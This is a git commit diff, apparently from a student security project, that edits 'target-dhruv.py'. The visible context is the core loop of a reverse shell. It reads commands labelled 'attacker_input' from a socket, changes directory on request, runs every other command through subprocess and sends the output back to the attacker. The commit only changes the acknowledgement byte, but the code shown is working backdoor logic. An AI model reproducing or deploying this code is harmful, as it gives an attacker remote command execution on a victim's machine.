84003c81a86e78dfedd4c75ea7b832f8b456bc66
DhruvArora-03 <dhruvarora@utexas.edu>
2024-03-03 19:30:29 -0600

    nit

--- target-dhruv.py
+++ target-dhruv.py
@@ -29,7 +29,7 @@ try:
                 s.send('Please only use cd by itself with one argument. ex: "cd _____"')
             else:
                 os.chdir(attacker_input[1])
-                s.send(b' ')
+                s.send(b'\n')
         if len(attacker_input) > 0:
             result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
             s.send(result.stdout)
